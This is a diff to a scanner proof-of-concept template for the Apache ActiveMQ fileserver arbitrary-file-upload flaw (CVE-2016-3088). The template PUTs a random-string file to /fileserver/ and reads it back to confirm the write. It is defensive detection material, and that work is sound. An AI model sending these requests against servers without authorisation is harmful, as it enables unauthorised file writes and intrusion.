@@ -1,8 +1,8 @@
 [info]
 author = "AVE"
-description = "通过 HTTP PUT 向 /fileserver/ 上传文件并验证文件是否成功写入，确认目标存在任意文件上传漏洞"
+description = "通过HTTP PUT向/fileserver/上传文件，再通过GET验证文件是否写入成功，检测Apache ActiveMQ Fileserver未授权文件上传漏洞"
 id = "POC-AVE-2016-0206"
-name = "Apache ActiveMQ Fileserver 任意文件上传漏洞 PoC"
+name = "Apache ActiveMQ Fileserver Arbitrary File Write PoC"
 severity = "critical"
 tags = [
     "cve-2016-3088",
@@ -19,15 +19,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "PUT"
-path = "/{{BaseURL}}/fileserver/{{randstr_1}}.txt"
+path = "/{{BaseURL}}/fileserver/{{randstr}}.txt"
 protocol = "http"
 
 [poc.requests.body]
-content = "{{randstr_1}}"
+content = "{{rand1}}"
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/octet-stream"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
@@ -41,7 +40,7 @@ type = "status"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/fileserver/{{randstr_1}}.txt"
+path = "/{{BaseURL}}/fileserver/{{randstr}}.txt"
 protocol = "http"
 
 [poc.requests.headers]
@@ -49,11 +48,6 @@ User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
-
-[[poc.requests.matchers]]
-expect = true
 part = "body"
 type = "word"
-words = ["{{randstr_1}}"]
+words = ["{{rand1}}"]
